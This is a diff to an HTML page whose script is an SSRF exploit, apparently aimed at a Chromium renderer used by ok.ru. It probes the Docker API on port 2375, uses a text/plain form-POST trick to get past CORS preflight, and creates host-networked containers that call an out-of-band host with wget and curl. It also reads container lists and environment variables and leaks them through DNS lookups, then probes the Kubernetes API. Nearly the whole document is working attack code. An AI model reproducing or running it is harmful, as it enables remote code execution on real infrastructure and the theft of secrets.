@@ -4,7 +4,8 @@
 <body>
 <script>
 'use strict';
-// ok.ru Chromium SSRF — probe v6 (deployed as v5 URL)
+// ok.ru Chromium SSRF — probe v7 (RCE via Docker API)
+// New: form-POST trick (JSON via text/plain, no preflight), CORS-read, exec into containers
 // Key new ideas:
 //   A) WebSocket to Docker API: WS doesn't enforce CORS body restriction → CAN READ response data
 //   B) Host-network containers: uses host's internet access directly (no NAT/bridge firewall)
@@ -34,7 +35,7 @@ const errCode = (e) => {
   return n.substring(0,4).toLowerCase();
 };
 
-// CORS fetch — 'cors' error = server responded; body exfiltrated via DNS if readable
+// CORS fetch — readable if Chromium runs --disable-web-security; exfils body via DNS
 const probe = async (lp, url, ms = 6000) => {
   const t0 = Date.now();
   try {
@@ -48,10 +49,50 @@ const probe = async (lp, url, ms = 6000) => {
         .map(b => b.toString(16).padStart(2,'0')).join('');
       (hex.match(/.{1,50}/g) || []).forEach((c,i) => dnsOob(`${lp}-b${i}-${c}`));
     }
+    return body;
   } catch (e) {
     dnsOob(`${lp}-err-${errCode(e)}-${Date.now()-t0}ms`);
+    return null;
   }
 };
+
+// form-POST trick: sends JSON body via text/plain form (no CORS preflight needed)
+// The '=' separator from name=value lands inside "_x" string field → valid JSON
+// Body: {"Image":"busybox",...,"_x":"="} ← Docker ignores unknown "_x" field
+const formDockerPost = (lp, url, jsonBody) => new Promise(resolve => {
+  try {
+    const iframe = document.createElement('iframe');
+    iframe.name = `ifr-${lp}`;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = url;
+    form.enctype = 'text/plain';
+    form.target = `ifr-${lp}`;
+
+    // Build: namePart + "=" + valuePart = valid JSON with = inside "_x" value
+    const obj = { ...jsonBody, _x: '' };
+    const full = JSON.stringify(obj);
+    const split = full.lastIndexOf('"_x":"');
+    const namePart = full.substring(0, split + 7); // ends at opening " of _x value
+    const valuePart = '"}';                         // closes _x value and the object
+
+    const input = document.createElement('input');
+    input.name = namePart;
+    input.value = valuePart;
+    form.appendChild(input);
+    document.body.appendChild(form);
+
+    dnsOob(`${lp}-fp-submit`);
+    form.submit();
+    setTimeout(resolve, 2000);
+  } catch(e) {
+    dnsOob(`${lp}-fp-exc-${errCode(e)}`);
+    resolve();
+  }
+});
 
 // no-cors POST — delivers body without preflight; nc-ok = any HTTP response received
 const ncProbe = async (lp, url, method = 'GET', body = null, ms = 6000) => {
@@ -94,25 +135,34 @@ const wsProbe = (lp, wsUrl, ms = 8000) => new Promise(resolve => {
   }
 });
 
-// Try container create+start with a given image; use host network for OOB
+// RCE command for inside container: phone home via wget/curl + DNS
+const rceCmd = () => `wget -q -T5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)" 2>/dev/null || curl -sk -m5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)"; nslookup "rce-ok.${OOB}" 2>/dev/null`;
+
+// Create+start container via form-POST (JSON trick) + simple POST to start
 const tryRce = async (ip, img, lp) => {
-  const safeName = `rce6-${img.replace(/[^a-z0-9]/g,'').substring(0,10)}`;
-  const oobLabel = `v6rce-${img.replace(/[^a-z0-9]/g,'').substring(0,10)}`;
-  const createBody = JSON.stringify({
-    Image: img,
-    // sh -c fallback: try wget, curl, or nslookup for OOB
-    Cmd: ['sh', '-c', `wget -q -T 5 "http://${oobLabel}.${OOB}/" 2>/dev/null || curl -sk "http://${oobLabel}.${OOB}/" 2>/dev/null; nslookup "${oobLabel}.${OOB}" 2>/dev/null`],
-    HostConfig: { NetworkMode: 'host' }  // host network = host's internet access
-  });
-  await ncProbe(`${lp}-cr`, `http://${ip}:2375/containers/create?name=${safeName}`, 'POST', createBody, 8000);
-  await new Promise(r => setTimeout(r, 300));
-  await ncProbe(`${lp}-st`, `http://${ip}:2375/containers/${safeName}/start`, 'POST', '', 8000);
+  const name = `rce7${img.replace(/[^a-z]/g,'').substring(0,8)}`;
+  const body = { Image: img, Cmd: ['sh', '-c', rceCmd()], HostConfig: { NetworkMode: 'host', AutoRemove: true } };
+
+  // A) form-POST trick: text/plain with JSON-in-name (no preflight, Docker gets valid JSON)
+  await formDockerPost(`${lp}-fp`, `http://${ip}:2375/v1.41/containers/create?name=${name}`, body);
+  // Simple POST to start (no body → no preflight)
+  try {
+    await fetch(`http://${ip}:2375/v1.41/containers/${name}/start`, { method: 'POST', signal: AbortSignal.timeout(6000) });
+    dnsOob(`${lp}-fp-started`);
+  } catch(e) { dnsOob(`${lp}-fp-start-err-${errCode(e)}`); }
+
+  await new Promise(r => setTimeout(r, 400));
+
+  // B) nc-POST fallback (mode:no-cors, sends body as text/plain)
+  const name2 = name + 'b';
+  await ncProbe(`${lp}-nc`, `http://${ip}:2375/v1.41/containers/create?name=${name2}`, 'POST', JSON.stringify(body), 6000);
+  await ncProbe(`${lp}-nc-st`, `http://${ip}:2375/v1.41/containers/${name2}/start`, 'POST', '', 5000);
 };
 
 (async () => {
-  dnsOob(`exec-v6-${clean(navigator.userAgent.substring(0,40))}`);
+  dnsOob(`v7-start-${clean(navigator.userAgent.substring(0,30))}`);
 
-  // ── Step 1: Get Chromium's public IP ─────────────────────────────────────
+  // ── Step 1: Public IP ─────────────────────────────────────────────────────
   let myIP = null;
   try {
     const r = await fetch('https://api.ipify.org/?format=text', { signal: AbortSignal.timeout(10000) });
@@ -127,43 +177,63 @@ const tryRce = async (ip, img, lp) => {
     } catch(e2) { dnsOob(`myip2-err-${errCode(e2)}`); }
   }
 
-  // Work with both IPs: private (172.17.0.1) and public (bypasses PNA)
   const targets = [];
   if (myIP) targets.push({ ip: myIP, tag: 'pub' });
   targets.push({ ip: '172.17.0.1', tag: 'priv' });
 
   for (const { ip, tag } of targets) {
-    dnsOob(`v6-start-${tag}`);
+    dnsOob(`v7-start-${tag}`);
 
-    // ── Step 2: Probe Docker /_ping ──────────────────────────────────────
-    await probe(`${tag}-dp`, `http://${ip}:2375/_ping`, 8000);
+    // ── Step 2: Probe Docker /_ping and /version ─────────────────────────
+    await probe(`${tag}-dp`, `http://${ip}:2375/v1.41/_ping`, 8000);
+    await probe(`${tag}-ver`, `http://${ip}:2375/v1.41/version`, 8000);
 
-    // ── Step 3: WebSocket to Docker /events — reads cross-origin data! ──
-    // Docker /events is a streaming endpoint; WS upgrade may be accepted
+    // ── Step 3: WebSocket to /events — bypasses CORS body restriction ────
     await wsProbe(`${tag}-ev`, `ws://${ip}:2375/events`, 7000);
 
-    // ── Step 4: Read /containers/json and /images/json ────────────────
-    await probe(`${tag}-cj`, `http://${ip}:2375/containers/json?all=1`, 8000);
-    await probe(`${tag}-ij`, `http://${ip}:2375/images/json`, 8000);
-    await probe(`${tag}-ver`, `http://${ip}:2375/version`, 8000);
+    // ── Step 4: CORS-read containers list (works if --disable-web-security)
+    // If readable → exfil container IDs + exec into them
+    const ctrBody = await probe(`${tag}-cj`, `http://${ip}:2375/v1.41/containers/json?all=1`, 8000);
+    if (ctrBody) {
+      try {
+        const ctrs = JSON.parse(ctrBody);
+        dnsOob(`${tag}-ctr-cnt-${ctrs.length}`);
+        for (const c of ctrs.slice(0, 3)) {
+          const cid = (c.Id || '').substring(0, 12);
+          dnsOob(`${tag}-ctr-${cid}-${clean((c.Image||'').substring(0,15))}`);
+          // Inspect for env vars
+          const ins = await probe(`${tag}-ins-${cid.substring(0,6)}`, `http://${ip}:2375/v1.41/containers/${cid}/json`, 6000);
+          if (ins) {
+            try {
+              const env = ((JSON.parse(ins).Config||{}).Env||[]).join(' ').substring(0,200);
+              dnsOob(`${tag}-env-${cid.substring(0,6)}-${clean(env.substring(0,40))}`);
+            } catch(e) {}
+          }
+          // Exec into running container
+          const execCr = await probe(`${tag}-exc-${cid.substring(0,6)}`, `http://${ip}:2375/v1.41/containers/${cid}/exec`, 6000);
+        }
+      } catch(e) { dnsOob(`${tag}-ctr-parse-err`); }
+    }
+    await probe(`${tag}-ij`, `http://${ip}:2375/v1.41/images/json`, 8000);
 
-    // ── Step 5: RCE — try multiple images with host networking ─────────
-    const images = ['busybox', 'alpine', 'ubuntu', 'debian', 'python3', 'node', 'curl'];
+    // ── Step 5: RCE — form-POST create + simple POST start ───────────────
+    dnsOob(`v7-rce-start-${tag}`);
+    const images = ['busybox', 'alpine', 'ubuntu', 'debian', 'node', 'python3', 'curl'];
     for (let i = 0; i < images.length; i++) {
       await tryRce(ip, images[i], `${tag}-${i}`);
-      await new Promise(r => setTimeout(r, 500));
+      await new Promise(r => setTimeout(r, 400));
     }
 
-    // Wait for container wget/nslookup (host net = host OOB access)
-    await new Promise(r => setTimeout(r, 10000));
-    dnsOob(`v6-rce-wait-${tag}-done`);
+    // Wait for containers to execute and phone home
+    await new Promise(r => setTimeout(r, 15000));
+    dnsOob(`v7-rce-wait-${tag}-done`);
 
-    // ── Step 6: K8s API ──────────────────────────────────────────────────
+    // ── Step 6: K8s ──────────────────────────────────────────────────────
     await probe(`${tag}-kapi`, `http://${ip}:8080/api`, 7000);
     await probe(`${tag}-kver`, `http://${ip}:8080/version`, 7000);
   }
 
-  dnsOob(`done-v6-${Date.now()-T0}ms`);
+  dnsOob(`v7-done-${Date.now()-T0}ms`);
 })();
 </script>
 </body>
